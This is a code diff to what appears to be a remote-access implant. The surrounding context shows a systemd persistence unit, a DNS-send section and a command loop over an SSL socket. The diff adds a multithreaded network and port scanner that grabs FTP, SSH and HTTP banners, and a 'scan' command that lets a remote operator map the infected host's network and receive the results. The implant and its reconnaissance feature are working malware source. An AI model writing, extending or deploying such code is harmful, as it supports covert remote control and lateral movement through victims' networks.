@@ -5,8 +5,10 @@ import os
 import platform
 import struct
 import sys
+import threading
 from base64 import b64encode
 from shutil import copyfile
+from ipaddress import IPv4Network
 
 # Static globals
 SYSTEM = platform.system()
@@ -23,6 +25,139 @@ RestartSec=3
 [Install]
 WantedBy=default.target
 """
+
+''' NETWORK SCAN '''
+
+
+def scan_port(ip, port, status_port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((ip, port))
+        if result == 0:
+            status_port[str(port)] = None
+            if port == 21:
+                try:
+                    sock.send(b'ftp\r\n')
+                    banner = sock.recv(1024)
+                    status_port[str(port)] = banner.decode().strip()
+                except:
+                    pass
+            elif port == 22:
+                try:
+                    banner = sock.recv(1024)
+                    status_port[str(port)] = banner.decode().strip()
+                except:
+                    pass
+            elif port == 80:
+                try:
+                    sock.send(b'GET /robots.txt HTTP/1.1\r\nHost: example.com\r\n\r\n')
+                    banner = sock.recv(1024)
+                    status_port[str(port)] = banner.decode().strip()
+                except:
+                    pass
+        sock.close()
+    except socket.error:
+        pass
+
+
+def scan_ports(ip, start_port, end_port, status_ports: dict):
+    status_ports[ip] = {}
+    for port in range(start_port, end_port + 1):
+        scan_port(ip, port, status_ports[ip])
+
+
+def ping_host(ip: str):
+    if platform.system() == "Windows":
+        try:
+            subprocess.check_output(f"ping -n 1 -w 1 {ip}", shell=True, universal_newlines=True)
+            return True
+        except subprocess.CalledProcessError:
+            return False
+    elif platform.system() == "Linux":
+        try:
+            subprocess.check_output(["ping", "-n", "-W1", "-i", "1", "-c", "1", ip])
+            return True
+        except subprocess.CalledProcessError:
+            return False
+
+
+def scan_ip(ip_target: str, online_ips: list, status_ports: dict):
+    if ping_host(ip_target):
+        online_ips.append(ip_target)
+        scan_ports(ip_target, 1, 1024, status_ports)
+
+
+def scan_network_ips(network: IPv4Network) -> str:
+    online_ips = []
+    threads = []
+    status_ports = {}
+
+    output = ""
+    output += f"Scanning du réseau {network}...\n"
+    for ip in network:
+        if ip == list(network)[-1]:
+            # Don't scan broadcast address
+            continue
+        t = threading.Thread(target=scan_ip, args=(str(ip), online_ips, status_ports))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+    if online_ips:
+        output += f"\n\033[4mOnline host(s) IP :\033[0m\n"
+        output += "\n".join(online_ips) + "\n"
+
+    if status_ports:
+        output += "\n\n\033[4mOpen port by IP :\033[0m\n"
+        for host in status_ports:
+            if status_ports[host]:
+                output += f"{host}:\n"
+                for port, banner in status_ports[host].items():
+                    output += f"Port {port} open\n"
+                    if banner:
+                        output += f"Banner: {banner}\n\n"
+            else:
+                output += f"No open port found on {host} !\n"
+    else:
+        output += "\nNo port open on any network host !\n"
+
+    return output
+
+
+def start_network_scan(target: str) -> str:
+    target_network = target_ip = None
+    if "/" in target:
+        target_network = IPv4Network(target)
+    else:
+        target_ip = target
+
+    if target_ip:
+        status_ports = {}
+
+        threads = []
+        for port in range(1, 1024):
+            t = threading.Thread(target=scan_port, args=(target_ip, port, status_ports))
+            threads.append(t)
+            t.start()
+
+        for t in threads:
+            t.join()
+
+        if status_ports:
+            output = ""
+            for port, banner in status_ports.items():
+                output += f"Port {port} open\n"
+                if banner:
+                    output += f"Banner: {banner}\n\n"
+            return output
+        else:
+            return f"Not open ports found on {target_ip}"
+
+    elif target_network:
+        return scan_network_ips(target_network)
 
 
 ''' DNS SEND '''
@@ -272,6 +407,9 @@ def process_instructions(ss: ssl.SSLSocket):
                         ss.send(b"ok")
                     else:
                         ss.send(b"ko")
+                case b"scan":
+                    output = start_network_scan(buffer.split(b" ")[1].decode())
+                    ss.send(output.encode())
                 case _:
                     print(f"Unknown command received: '{buffer.decode()}'")
                     ss.send(b"unknown")
